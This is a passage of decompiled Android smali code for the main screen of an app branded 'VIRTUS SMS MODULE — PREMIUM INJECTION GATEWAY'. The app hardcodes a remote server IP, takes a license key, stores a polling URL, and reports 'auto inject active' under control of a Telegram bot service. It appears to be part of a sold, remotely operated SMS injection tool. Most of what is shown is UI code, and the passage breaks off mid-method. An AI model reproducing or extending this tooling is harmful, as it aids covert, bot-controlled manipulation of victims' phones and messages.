.class public Lcom/virtus/module/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/virtus/module/MainActivity$ThreeDIconView;
    }
.end annotation


# static fields
.field private static final BASE_URL:Ljava/lang/String; = "http://38.109.10.80:9090"

.field private static final KEY_PREF:Ljava/lang/String; = "license_key"

.field private static final PREFS:Ljava/lang/String; = "virtus_module_prefs"


# instance fields
.field private isRestoring:Z

.field private keyInput:Landroid/widget/EditText;

.field private prefs:Landroid/content/SharedPreferences;

.field private statusText:Landroid/widget/TextView;

.field private toggleSwitch:Landroid/widget/Switch;

.field private uiHandler:Landroid/os/Handler;

.field private uptimeText:Landroid/widget/TextView;

.field private final uptimeTick:Ljava/lang/Runnable;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 45
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 56
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lcom/virtus/module/MainActivity;->uiHandler:Landroid/os/Handler;

    const/4 v0, 0x0

    .line 57
    iput-boolean v0, p0, Lcom/virtus/module/MainActivity;->isRestoring:Z

    .line 59
    new-instance v0, Lcom/virtus/module/MainActivity$1;

    invoke-direct {v0, p0}, Lcom/virtus/module/MainActivity$1;-><init>(Lcom/virtus/module/MainActivity;)V

    iput-object v0, p0, Lcom/virtus/module/MainActivity;->uptimeTick:Ljava/lang/Runnable;

    return-void
.end method

.method static synthetic access$000(Lcom/virtus/module/MainActivity;)V
    .locals 0

    .line 45
    invoke-direct {p0}, Lcom/virtus/module/MainActivity;->refreshUptime()V

    return-void
.end method

.method static synthetic access$100(Lcom/virtus/module/MainActivity;)Landroid/os/Handler;
    .locals 0

    .line 45
    iget-object p0, p0, Lcom/virtus/module/MainActivity;->uiHandler:Landroid/os/Handler;

    return-object p0
.end method

.method static synthetic access$1100(Lcom/virtus/module/MainActivity;I)I
    .locals 0

    .line 45
    invoke-direct {p0, p1}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result p0

    return p0
.end method

.method static synthetic access$200(Lcom/virtus/module/MainActivity;)V
    .locals 0

    .line 45
    invoke-direct {p0}, Lcom/virtus/module/MainActivity;->runTest()V

    return-void
.end method

.method static synthetic access$300(Lcom/virtus/module/MainActivity;)Z
    .locals 0

    .line 45
    iget-boolean p0, p0, Lcom/virtus/module/MainActivity;->isRestoring:Z

    return p0
.end method

.method static synthetic access$400(Lcom/virtus/module/MainActivity;)Landroid/content/SharedPreferences;
    .locals 0

    .line 45
    iget-object p0, p0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;

    return-object p0
.end method

.method static synthetic access$500(Lcom/virtus/module/MainActivity;)V
    .locals 0

    .line 45
    invoke-direct {p0}, Lcom/virtus/module/MainActivity;->refreshStatus()V

    return-void
.end method

.method static synthetic access$600(Lcom/virtus/module/MainActivity;)Landroid/widget/TextView;
    .locals 0

    .line 45
    iget-object p0, p0, Lcom/virtus/module/MainActivity;->statusText:Landroid/widget/TextView;

    return-object p0
.end method

.method private btnBg()Landroid/graphics/drawable/GradientDrawable;
    .locals 4

    .line 447
    new-instance v0, Landroid/graphics/drawable/GradientDrawable;

    sget-object v1, Landroid/graphics/drawable/GradientDrawable$Orientation;->LEFT_RIGHT:Landroid/graphics/drawable/GradientDrawable$Orientation;

    const-string v2, "#1565C0"

    .line 449
    invoke-static {v2}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v2

    const-string v3, "#2196F3"

    invoke-static {v3}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v3

    filled-new-array {v2, v3}, [I

    move-result-object v2

    invoke-direct {v0, v1, v2}, Landroid/graphics/drawable/GradientDrawable;-><init>(Landroid/graphics/drawable/GradientDrawable$Orientation;[I)V

    const/16 v1, 0x10

    .line 450
    invoke-direct {p0, v1}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v1

    int-to-float v1, v1

    invoke-virtual {v0, v1}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    return-object v0
.end method

.method private cardBg()Landroid/graphics/drawable/GradientDrawable;
    .locals 4

    .line 430
    new-instance v0, Landroid/graphics/drawable/GradientDrawable;

    sget-object v1, Landroid/graphics/drawable/GradientDrawable$Orientation;->TL_BR:Landroid/graphics/drawable/GradientDrawable$Orientation;

    const-string v2, "#151B2E"

    .line 432
    invoke-static {v2}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v2

    const-string v3, "#0D1220"

    invoke-static {v3}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v3

    filled-new-array {v2, v3}, [I

    move-result-object v2

    invoke-direct {v0, v1, v2}, Landroid/graphics/drawable/GradientDrawable;-><init>(Landroid/graphics/drawable/GradientDrawable$Orientation;[I)V

    const/16 v1, 0x16

    .line 433
    invoke-direct {p0, v1}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v1

    int-to-float v1, v1

    invoke-virtual {v0, v1}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    const/4 v1, 0x1

    .line 434
    invoke-direct {p0, v1}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v1

    const-string v2, "#2A3350"

    invoke-static {v2}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v2

    invoke-virtual {v0, v1, v2}, Landroid/graphics/drawable/GradientDrawable;->setStroke(II)V

    return-object v0
.end method

.method private dp(I)I
    .locals 1

    .line 455
    invoke-virtual {p0}, Lcom/virtus/module/MainActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v0

    iget v0, v0, Landroid/util/DisplayMetrics;->density:F

    int-to-float p1, p1

    mul-float v0, v0, p1

    invoke-static {v0}, Ljava/lang/Math;->round(F)I

    move-result p1

    return p1
.end method

.method private inputBg()Landroid/graphics/drawable/GradientDrawable;
    .locals 3

    .line 439
    new-instance v0, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v0}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    .line 440
    const-string v1, "#0E1424"

    invoke-static {v1}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v0, v1}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    const/16 v1, 0xe

    .line 441
    invoke-direct {p0, v1}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v1

    int-to-float v1, v1

    invoke-virtual {v0, v1}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    const/4 v1, 0x1

    .line 442
    invoke-direct {p0, v1}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v1

    const-string v2, "#3A4470"

    invoke-static {v2}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v2

    invoke-virtual {v0, v1, v2}, Landroid/graphics/drawable/GradientDrawable;->setStroke(II)V

    return-object v0
.end method

.method private refreshStatus()V
    .locals 3

    .line 270
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->statusText:Landroid/widget/TextView;

    if-nez v0, :cond_0

    return-void

    .line 271
    :cond_0
    sget-boolean v0, Lcom/virtus/module/TelegramPollingService;->cfgMonitoring:Z

    if-eqz v0, :cond_1

    .line 272
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->statusText:Landroid/widget/TextView;

    const-string v1, "\u25cf MONITORING LIVE \u2014 auto inject active"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 273
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->statusText:Landroid/widget/TextView;

    const-string v1, "#69F0AE"

    invoke-static {v1}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTextColor(I)V

    return-void

    .line 274
    :cond_1
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;

    const-string v1, "service_on"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 275
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->statusText:Landroid/widget/TextView;

    const-string v1, "Service running \u2014 monitoring OFF (start from bot)"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 276
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->statusText:Landroid/widget/TextView;

    const-string v1, "#64B5F6"

    invoke-static {v1}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTextColor(I)V

    return-void

    .line 278
    :cond_2
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->statusText:Landroid/widget/TextView;

    const-string v1, "Idle \u2014 enter key & press test"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 279
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->statusText:Landroid/widget/TextView;

    const-string v1, "#8A94B0"

    invoke-static {v1}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTextColor(I)V

    return-void
.end method

.method private refreshUptime()V
    .locals 11

    .line 252
    sget-wide v0, Lcom/virtus/module/TelegramPollingService;->cfgTs:J

    .line 253
    sget-boolean v2, Lcom/virtus/module/TelegramPollingService;->cfgMonitoring:Z

    const/high16 v3, 0x41200000    # 10.0f

    const/4 v4, 0x0

    if-eqz v2, :cond_1

    const-wide/16 v5, 0x0

    cmp-long v2, v0, v5

    if-lez v2, :cond_1

    .line 255
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v7

    sub-long/2addr v7, v0

    const-wide/16 v0, 0x3e8

    div-long/2addr v7, v0

    cmp-long v0, v7, v5

    if-gez v0, :cond_0

    goto :goto_0

    :cond_0
    move-wide v5, v7

    :goto_0
    const-wide/16 v0, 0xe10

    .line 257
    div-long v7, v5, v0

    rem-long v0, v5, v0

    const-wide/16 v9, 0x3c

    div-long/2addr v0, v9

    rem-long/2addr v5, v9

    .line 258
    iget-object v2, p0, Lcom/virtus/module/MainActivity;->uptimeText:Landroid/widget/TextView;

    invoke-static {v7, v8}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v7

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    invoke-static {v5, v6}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    const/4 v5, 0x3

    new-array v5, v5, [Ljava/lang/Object;

    const/4 v6, 0x0

    aput-object v7, v5, v6

    const/4 v6, 0x1

    aput-object v0, v5, v6

    const/4 v0, 0x2

    aput-object v1, v5, v0

    const-string v0, "%02d:%02d:%02d"

    invoke-static {v0, v5}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 259
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->uptimeText:Landroid/widget/TextView;

    const-string v1, "#69F0AE"

    invoke-static {v1}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTextColor(I)V

    .line 260
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->uptimeText:Landroid/widget/TextView;

    const-string v1, "#00E676"

    invoke-static {v1}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v0, v3, v4, v4, v1}, Landroid/widget/TextView;->setShadowLayer(FFFI)V

    goto :goto_1

    .line 262
    :cond_1
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->uptimeText:Landroid/widget/TextView;

    const-string v1, "\u2014"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 263
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->uptimeText:Landroid/widget/TextView;

    const-string v1, "#64B5F6"

    invoke-static {v1}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTextColor(I)V

    .line 264
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->uptimeText:Landroid/widget/TextView;

    const-string v1, "#2196F3"

    invoke-static {v1}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v0, v3, v4, v4, v1}, Landroid/widget/TextView;->setShadowLayer(FFFI)V

    .line 266
    :goto_1
    invoke-direct {p0}, Lcom/virtus/module/MainActivity;->refreshStatus()V

    return-void
.end method

.method private runTest()V
    .locals 4

    .line 285
    iget-object v0, p0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    .line 286
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 287
    const-string v0, "Enter license key first!"

    const/4 v1, 0x0

    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    return-void

    .line 290
    :cond_0
    move-object v3, v0

    const-string v1, "|"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :virtus_save_plain_key

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    aget-object v0, v1, v2

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x1

    aget-object v1, v1, v2

    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v3, "firebase_poll_url"

    invoke-interface {v2, v3, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    :virtus_save_plain_key
    iget-object v1, p0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "license_key"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/virtus/module/MainActivity$BotSync;

    invoke-direct {v2, p0, v3}, Lcom/virtus/module/MainActivity$BotSync;-><init>(Lcom/virtus/module/MainActivity;Ljava/lang/String;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V


    .line 292
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/virtus/module/MainActivity$4;

    invoke-direct {v1, p0, p0}, Lcom/virtus/module/MainActivity$4;-><init>(Lcom/virtus/module/MainActivity;Landroid/app/Activity;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 312
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 16

    move-object/from16 v0, p0

    .line 69
    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 70
    const-string v1, "virtus_module_prefs"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Lcom/virtus/module/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    iput-object v1, v0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;

    .line 73
    new-instance v1, Lcom/virtus/module/MainActivity$ThreeDIconView;

    invoke-direct {v1, v0, v0}, Lcom/virtus/module/MainActivity$ThreeDIconView;-><init>(Lcom/virtus/module/MainActivity;Landroid/content/Context;)V

    .line 75
    new-instance v3, Landroid/widget/ScrollView;

    invoke-direct {v3, v0}, Landroid/widget/ScrollView;-><init>(Landroid/content/Context;)V

    .line 76
    const-string v4, "#0A0E1A"

    invoke-static {v4}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v4

    invoke-virtual {v3, v4}, Landroid/widget/ScrollView;->setBackgroundColor(I)V

    const/4 v4, 0x1

    .line 77
    invoke-virtual {v3, v4}, Landroid/widget/ScrollView;->setFillViewport(Z)V

    .line 79
    new-instance v5, Landroid/widget/LinearLayout;

    invoke-direct {v5, v0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 80
    invoke-virtual {v5, v4}, Landroid/widget/LinearLayout;->setOrientation(I)V

    const/16 v6, 0x16

    .line 81
    invoke-direct {v0, v6}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v6

    const/16 v7, 0x1e

    .line 82
    invoke-direct {v0, v7}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v8

    invoke-direct {v0, v7}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v7

    invoke-virtual {v5, v6, v8, v6, v7}, Landroid/widget/LinearLayout;->setPadding(IIII)V

    .line 83
    invoke-virtual {v5, v4}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 86
    new-instance v6, Landroid/widget/FrameLayout;

    invoke-direct {v6, v0}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    .line 87
    new-instance v7, Landroid/widget/LinearLayout$LayoutParams;

    const/16 v8, 0x82

    invoke-direct {v0, v8}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v9

    invoke-direct {v0, v8}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v10

    invoke-direct {v7, v9, v10}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 88
    invoke-virtual {v6, v7}, Landroid/widget/FrameLayout;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 89
    new-instance v7, Landroid/widget/FrameLayout$LayoutParams;

    invoke-direct {v0, v8}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v9

    invoke-direct {v0, v8}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v8

    invoke-direct {v7, v9, v8}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v6, v1, v7}, Landroid/widget/FrameLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 90
    invoke-virtual {v5, v6}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 91
    invoke-virtual {v1}, Lcom/virtus/module/MainActivity$ThreeDIconView;->start()V

    .line 94
    new-instance v1, Landroid/widget/TextView;

    invoke-direct {v1, v0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 95
    const-string v6, "VIRTUS SMS MODULE"

    invoke-virtual {v1, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const/high16 v6, 0x41a80000    # 21.0f

    .line 96
    invoke-virtual {v1, v6}, Landroid/widget/TextView;->setTextSize(F)V

    const/16 v6, 0x11

    .line 97
    invoke-virtual {v1, v6}, Landroid/widget/TextView;->setGravity(I)V

    .line 98
    const-string v7, "sans-serif-black"

    invoke-static {v7, v4}, Landroid/graphics/Typeface;->create(Ljava/lang/String;I)Landroid/graphics/Typeface;

    move-result-object v7

    invoke-virtual {v1, v7}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    const/4 v7, -0x1

    .line 99
    invoke-virtual {v1, v7}, Landroid/widget/TextView;->setTextColor(I)V

    .line 100
    const-string v8, "#2196F3"

    invoke-static {v8}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v9

    const/high16 v10, 0x41400000    # 12.0f

    const/4 v11, 0x0

    invoke-virtual {v1, v10, v11, v11, v9}, Landroid/widget/TextView;->setShadowLayer(FFFI)V

    const/4 v9, 0x6

    .line 101
    invoke-direct {v0, v9}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v9

    invoke-virtual {v1, v2, v9, v2, v2}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 102
    invoke-virtual {v5, v1}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 104
    new-instance v1, Landroid/widget/TextView;

    invoke-direct {v1, v0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 105
    const-string v9, "PREMIUM INJECTION GATEWAY"

    invoke-virtual {v1, v9}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const/high16 v9, 0x41200000    # 10.0f

    .line 106
    invoke-virtual {v1, v9}, Landroid/widget/TextView;->setTextSize(F)V

    .line 107
    invoke-virtual {v1, v6}, Landroid/widget/TextView;->setGravity(I)V

    const v12, 0x3e19999a    # 0.15f

    .line 108
    invoke-virtual {v1, v12}, Landroid/widget/TextView;->setLetterSpacing(F)V

    .line 109
    const-string v12, "#8A94B0"

    invoke-static {v12}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v13

    invoke-virtual {v1, v13}, Landroid/widget/TextView;->setTextColor(I)V

    const/4 v13, 0x4

    .line 110
    invoke-direct {v0, v13}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v14

    invoke-virtual {v1, v2, v14, v2, v2}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 111
    invoke-virtual {v5, v1}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 114
    new-instance v1, Landroid/widget/LinearLayout;

    invoke-direct {v1, v0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 115
    invoke-virtual {v1, v4}, Landroid/widget/LinearLayout;->setOrientation(I)V

    .line 116
    invoke-direct {v0}, Lcom/virtus/module/MainActivity;->cardBg()Landroid/graphics/drawable/GradientDrawable;

    move-result-object v14

    invoke-virtual {v1, v14}, Landroid/widget/LinearLayout;->setBackground(Landroid/graphics/drawable/Drawable;)V

    .line 117
    new-instance v14, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v15, -0x2

    invoke-direct {v14, v7, v15}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    const/16 v15, 0x14

    .line 119
    invoke-direct {v0, v15}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v10

    invoke-virtual {v14, v2, v10, v2, v2}, Landroid/widget/LinearLayout$LayoutParams;->setMargins(IIII)V

    const/16 v10, 0x12

    .line 120
    invoke-direct {v0, v10}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v11

    invoke-direct {v0, v15}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v6

    invoke-direct {v0, v10}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v10

    invoke-direct {v0, v15}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v15

    invoke-virtual {v1, v11, v6, v10, v15}, Landroid/widget/LinearLayout;->setPadding(IIII)V

    .line 121
    invoke-virtual {v5, v1, v14}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 124
    new-instance v6, Landroid/widget/TextView;

    invoke-direct {v6, v0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 125
    const-string v10, "LICENSE KEY"

    invoke-virtual {v6, v10}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const/high16 v10, 0x41300000    # 11.0f

    .line 126
    invoke-virtual {v6, v10}, Landroid/widget/TextView;->setTextSize(F)V

    const v10, 0x3df5c28f    # 0.12f

    .line 127
    invoke-virtual {v6, v10}, Landroid/widget/TextView;->setLetterSpacing(F)V

    .line 128
    invoke-static {v8}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v11

    invoke-virtual {v6, v11}, Landroid/widget/TextView;->setTextColor(I)V

    .line 129
    sget-object v11, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;

    invoke-virtual {v6, v11}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    const/16 v11, 0x8

    .line 130
    invoke-direct {v0, v11}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v11

    invoke-virtual {v6, v2, v2, v2, v11}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 131
    invoke-virtual {v1, v6}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 133
    new-instance v6, Landroid/widget/EditText;

    invoke-direct {v6, v0}, Landroid/widget/EditText;-><init>(Landroid/content/Context;)V

    iput-object v6, v0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;

    .line 134
    const-string v11, "KEY-XXXX-XXXX-XXXX"

    invoke-virtual {v6, v11}, Landroid/widget/EditText;->setHint(Ljava/lang/CharSequence;)V

    .line 135
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;

    const/high16 v11, 0x41700000    # 15.0f

    invoke-virtual {v6, v11}, Landroid/widget/EditText;->setTextSize(F)V

    .line 136
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;

    invoke-virtual {v6, v7}, Landroid/widget/EditText;->setTextColor(I)V

    .line 137
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;

    const-string v11, "#4A5370"

    invoke-static {v11}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v11

    invoke-virtual {v6, v11}, Landroid/widget/EditText;->setHintTextColor(I)V

    .line 138
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;

    invoke-direct {v0}, Lcom/virtus/module/MainActivity;->inputBg()Landroid/graphics/drawable/GradientDrawable;

    move-result-object v11

    invoke-virtual {v6, v11}, Landroid/widget/EditText;->setBackground(Landroid/graphics/drawable/Drawable;)V

    .line 139
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;

    invoke-virtual {v6, v4}, Landroid/widget/EditText;->setSingleLine(Z)V

    .line 140
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;

    sget-object v11, Landroid/graphics/Typeface;->MONOSPACE:Landroid/graphics/Typeface;

    invoke-virtual {v6, v11}, Landroid/widget/EditText;->setTypeface(Landroid/graphics/Typeface;)V

    .line 141
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;

    const/16 v11, 0xe

    invoke-direct {v0, v11}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v14

    const/16 v15, 0xc

    invoke-direct {v0, v15}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v10

    invoke-direct {v0, v11}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v9

    invoke-direct {v0, v15}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v11

    invoke-virtual {v6, v14, v10, v9, v11}, Landroid/widget/EditText;->setPadding(IIII)V

    .line 142
    iget-object v6, v0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;

    invoke-virtual {v1, v6}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 145
    new-instance v6, Landroid/widget/Button;

    invoke-direct {v6, v0}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V

    .line 146
    const-string v9, "TEST INJECTION"

    invoke-virtual {v6, v9}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    const/high16 v9, 0x41600000    # 14.0f

    .line 147
    invoke-virtual {v6, v9}, Landroid/widget/Button;->setTextSize(F)V

    .line 148
    sget-object v10, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;

    invoke-virtual {v6, v10}, Landroid/widget/Button;->setTypeface(Landroid/graphics/Typeface;)V

    .line 149
    invoke-virtual {v6, v7}, Landroid/widget/Button;->setTextColor(I)V

    .line 150
    invoke-direct {v0}, Lcom/virtus/module/MainActivity;->btnBg()Landroid/graphics/drawable/GradientDrawable;

    move-result-object v10

    invoke-virtual {v6, v10}, Landroid/widget/Button;->setBackground(Landroid/graphics/drawable/Drawable;)V

    .line 151
    new-instance v10, Landroid/widget/LinearLayout$LayoutParams;

    const/16 v11, 0x32

    .line 152
    invoke-direct {v0, v11}, Lcom/virtus/module/MainActivity;->dp(I)I

    move-result v11

    invoke-direct {v10, v7, v11}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    const/16 v11, 0x10

    .line 153
